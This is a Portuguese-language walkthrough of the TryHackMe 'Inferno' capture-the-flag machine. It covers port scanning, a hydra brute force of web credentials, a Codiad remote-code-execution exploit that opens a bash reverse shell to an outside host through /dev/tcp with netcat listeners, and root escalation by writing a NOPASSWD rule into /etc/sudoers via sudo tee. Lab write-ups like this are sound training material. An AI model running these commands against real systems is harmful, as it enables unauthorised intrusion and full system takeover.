# Inferno


### IP
- IP="10.10.52.226"


### Nmap
```
PORT      STATE SERVICE           VERSION
21/tcp    open  ftp?
22/tcp    open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
|_  256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
23/tcp    open  telnet?
25/tcp    open  tcpwrapped
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http              Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Dante's Inferno
88/tcp    open  kerberos-sec?
106/tcp   open  pop3pw?
110/tcp   open  pop3?
389/tcp   open  ldap?
464/tcp   open  kpasswd5?
777/tcp   open  multiling-http?
783/tcp   open  spamassassin?
808/tcp   open  ccproxy-http?
873/tcp   open  rsync?
1001/tcp  open  webpush?
1236/tcp  open  bvcontrol?
1300/tcp  open  h323hostcallsc?
2000/tcp  open  cisco-sccp?
2003/tcp  open  finger?
|_finger: ERROR: Script execution failed (use -d to debug)
2121/tcp  open  ccproxy-ftp?
2601/tcp  open  zebra?
2602/tcp  open  ripd?
2604/tcp  open  ospfd?
2605/tcp  open  bgpd?
2607/tcp  open  connection?
2608/tcp  open  wag-service?
4224/tcp  open  xtell?
5051/tcp  open  ida-agent?
5555/tcp  open  freeciv?
5666/tcp  open  nrpe?
6346/tcp  open  gnutella?
6566/tcp  open  sane-port?
6667/tcp  open  irc?
|_irc-info: Unable to open connection
8021/tcp  open  ftp-proxy?
8081/tcp  open  blackice-icecap?
8088/tcp  open  radan-http?
9418/tcp  open  git?
10000/tcp open  snet-sensor-mgmt?
10082/tcp open  amandaidx?
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4.21
OS details: Linux 2.4.21
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Um binário escondido dentro da imagem.
```
exiftool 1.jpg 
ExifTool Version Number         : 12.16
File Name                       : 1.jpg
Directory                       : .
File Size                       : 664 KiB
File Modification Date/Time     : 2021:07:01 21:55:18-04:00
File Access Date/Time           : 2021:07:10 10:48:07-04:00
File Inode Change Date/Time     : 2021:07:02 22:03:16-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Little-endian (Intel, II)
Make                            : Panasonic
Camera Model Name               : DMC-TZ2
Orientation                     : Horizontal (normal)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Software                        : GIMP 2.10.14
Modify Date                     : 2020:11:04 21:45:21
Y Cb Cr Positioning             : Co-sited
Exposure Time                   : 1/25
F Number                        : 3.6
Exposure Program                : Program AE
ISO                             : 100
Exif Version                    : 0221
Date/Time Original              : 2010:04:23 14:08:46
Create Date                     : 2010:04:23 14:08:46
Components Configuration        : Y, Cb, Cr, -
Compressed Bits Per Pixel       : 4
Exposure Compensation           : -1
Max Aperture Value              : 3.3
Metering Mode                   : Multi-segment
Light Source                    : Unknown
Flash                           : Off, Did not fire
Focal Length                    : 5.5 mm
Video Frame Rate                : n/a
Battery Level                   : Medium
Highlight Warning               : No
Dark Focus Environment          : No
AF Assist Lamp                  : Enabled but Not Used
AF Area Mode                    : 1-area (high speed)
Audio                           : No
Baby Age                        : (not set)
Burst Mode                      : Off
Color Effect                    : Off
Color Mode                      : Natural
Contrast Mode                   : Normal
Conversion Lens                 : Off
Data Dump                       : (Binary data 6152 bytes, use -b option to extract)
Panasonic Exif Version          : 0220
Firmware Version                : 0.1.0.4
Flash Bias                      : 0
Focus Mode                      : Auto
Image Stabilization             : On, Mode 2
Internal Serial Number          : (F66) 2007:02:26 no. 0117
Macro Mode                      : Off
Maker Note Version              : 0101
Noise Reduction                 : Standard
Optical Zoom Mode               : Standard
Program ISO                     : 100
Image Quality                   : High
Rotation                        : Horizontal (normal)
Scene Mode                      : Off
Self Timer                      : Off
Sequence Number                 : 0
Shooting Mode                   : Normal
Text Stamp                      : Off
Time Since Power On             : 00:00:37.34
Travel Day                      : n/a
WB Blue Level                   : 1958
WB Green Level                  : 1054
WB Red Level                    : 2280
White Balance                   : Auto
White Balance Bias              : 0
World Time Location             : Home
Flashpix Version                : 0100
Color Space                     : sRGB
Exif Image Width                : 2735
Exif Image Height               : 1910
Sensing Method                  : One-chip color area
File Source                     : Digital Camera
Scene Type                      : Directly photographed
Custom Rendered                 : Normal
Exposure Mode                   : Auto
Digital Zoom Ratio              : 0
Focal Length In 35mm Format     : 34 mm
Scene Capture Type              : Standard
Gain Control                    : None
Contrast                        : Normal
Saturation                      : Low
Sharpness                       : Soft
Compression                     : JPEG (old-style)
Photometric Interpretation      : YCbCr
Samples Per Pixel               : 3
Thumbnail Offset                : 7612
Thumbnail Length                : 12449
Profile CMM Type                : Little CMS
Profile Version                 : 4.3.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2020:11:04 20:43:19
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : GIMP built-in sRGB
Profile Copyright               : Public Domain
Media White Point               : 0.9642 1 0.82491
Chromatic Adaptation            : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168
Red Matrix Column               : 0.43604 0.22249 0.01392
Blue Matrix Column              : 0.14305 0.06061 0.71393
Green Matrix Column             : 0.38512 0.7169 0.09706
Red Tone Reproduction Curve     : (Binary data 32 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 32 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 32 bytes, use -b option to extract)
Chromaticity Channels           : 3
Chromaticity Colorant           : Unknown (0)
Chromaticity Channel 1          : 0.64 0.33002
Chromaticity Channel 2          : 0.3 0.60001
Chromaticity Channel 3          : 0.15001 0.06
Device Mfg Desc                 : GIMP
Device Model Desc               : sRGB
Image Width                     : 2735
Image Height                    : 1910
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Aperture                        : 3.6
Blue Balance                    : 1.857685
Image Size                      : 2735x1910
Megapixels                      : 5.2
Red Balance                     : 2.163188
Scale Factor To 35 mm Equivalent: 6.2
Shutter Speed                   : 1/25
Thumbnail Image                 : (Binary data 12449 bytes, use -b option to extract)
Circle Of Confusion             : 0.005 mm
Field Of View                   : 55.8 deg
Focal Length                    : 5.5 mm (35 mm equivalent: 34.0 mm)
Hyperfocal Distance             : 1.73 m
Light Value                     : 8.3
```
### Gobuster
```
http://10.10.79.18/inferno              (Status: 401) [Size: 458]
```

### Identificação da requisição de login e senha
- Identificado que a solicitação de login e senha do diretório web "/inferno", é uma requisição do tipo GET
```
GET /inferno HTTP/1.1
Host: 10.10.189.172
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### Brute force no login e senha
- Utilização do hydra para o ataque de força bruta, com um arquivo de usuários (root, admin, dante, inferno) em conjunto com a wordlist de senhas rockyou.
- Identificado o usuário e senha "admin/dante1".
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.189.172 http-get /inferno/ -t 64
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-11 15:52:56
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://10.10.189.172:80/inferno/
[STATUS] 3005.00 tries/min, 3005 tries in 00:01h, 14341394 to do in 79:33h, 64 active
[STATUS] 4018.33 tries/min, 12055 tries in 00:03h, 14332344 to do in 59:27h, 64 active
[80][http-get] host: 10.10.189.172   login: admin   password: dante1
[STATUS] attack finished for 10.10.189.172 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-11 15:56:24
```
- A próxima tela também é uma aplicação que pede login e senha, conseguimos nos autenticar com as mesmas credenciais anteriores.

### Exploração da aplicação
- Identificado um exploit para a Codiad que está instalado no servidor alvo.
	- https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit
	- Executado o exploit, comforme a documentação do link acima, com o login encontrado.
```
Shell 1:

python exploit.py http://admin:dante1@10.10.160.205/inferno/ 'admin' 'dante1' 10.9.185.104 5353 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.9.185.104/5354 0>&1 2>&1"' | nc -lnvp 5353
nc -lnvp 5354
[+] Please confirm that you have done the two command above [y/n]
[Y/n] Y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"inferno","path":"\/var\/www\/html\/inferno"}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...

Shell 2:

echo 'bash -c "bash -i >/dev/tcp/10.9.185.104/5354 0>&1 2>&1"' | nc -lnvp 5353
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::5353
Ncat: Listening on 0.0.0.0:5353
Ncat: Connection from 10.10.160.205.
Ncat: Connection from 10.10.160.205:53404.

Shell 3:

nc -lnvp 5354
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::5354
Ncat: Listening on 0.0.0.0:5354
Ncat: Connection from 10.10.160.205.
Ncat: Connection from 10.10.160.205:45420.
bash: cannot set terminal process group (928): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Inferno:/var/www/html/inferno/components/filemanager$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
- Nos comandos acima, foi identificado que há muito instabilidades e fica fechando a conexão a todo o momento.
- O problema foi resolvido inserindos os comandos abaixo no terminal.
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
screen -S bash
```

### Captura da flag de usuário
- Dentro do /home/dante, não conseguimos abrir o arquivo local.txt
```
$ cd /home/dante
$ cat local.txt
cat: local.txt: Permission denied
```
- Identificado dentro de /home/dante/Downloads um arquivo oculto '.download.dat', que dentro dele há um código em hexadecimal.
```
/home/dante/Downloads
$ ls   
ls
CantoI.docx    CantoIX.docx   CantoX.docx     CantoXIV.docx  CantoXVII.docx
CantoII.docx   CantoV.docx    CantoXI.docx    CantoXIX.docx  CantoXVIII.docx
CantoIII.docx  CantoVI.docx   CantoXII.docx   CantoXV.docx   CantoXX.docx
CantoIV.docx   CantoVII.docx  CantoXIII.docx  CantoXVI.docx

$ cat .download.dat
cat .download.dat
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a$ 
```
- Ao usarmos a ferramenta de conversão de hex para ascii abaixo, conseguimos obter outras credenciais de acesso.
	- https://www.rapidtables.com/convert/number/hex-to-ascii.html
	- dante:V1rg1l10h3lpm3

- Com a credencial em mãos, conseguimos capturar a flag de usuário.
```
$ su dante 
su dante
Password: V1rg1l10h3lpm3

dante@Inferno:~/Downloads$ cd ..
cd ..
dante@Inferno:~$ ls
ls
Desktop    Downloads  Music     Public     Videos
Documents  local.txt  Pictures  Templates
dante@Inferno:~$ cat local.txt
cat local.txt
77f6f3c544ec0811e2d1243e2e0d1835
```

### Capturando a flag de root
- Identificado através do comando "sudo -l" que há o binário "Tee", lê da entrada padrão e grava na saída e arquivos padrão. Portanto, podemos editar qualquer arquivo de configuração para obter o shell de root.
```
sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
```
- Adicionamos as permissões de sudo para o usuário Dante, manipulando o /etc/sudoers, adicionando a linha "dante ALL=(ALL) ALL".
```
echo "dante ALL=(ALL) ALL" | sudo tee -a /etc/sudoers o tee -a /etc/sudoers

echo 'dante ALL = (ALL) NOPASSWD: ALL' | sudo tee -a / etc / sudoers

dante@Inferno:~$ echo 'dante ALL = (ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers           
echo 'dante ALL = (ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers
[sudo] password for dante: V1rg1l10h3lpm3

dante ALL = (ALL) NOPASSWD: ALL
```
- Agora capturamos a flag de root.
```
proof.txt
root@Inferno:/root# cat proof.txt
cat proof.txt
Congrats!

You've rooted Inferno!

f332678ed0d0767d7434b8516a7c6144

mindsflee
```

### Write-Ups
- https://0xaniket.medium.com/tryhackme-inferno-1ddfbedae5dd
- https://onlineblogzone.com/tryhackme-inferno-writeup/
- https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit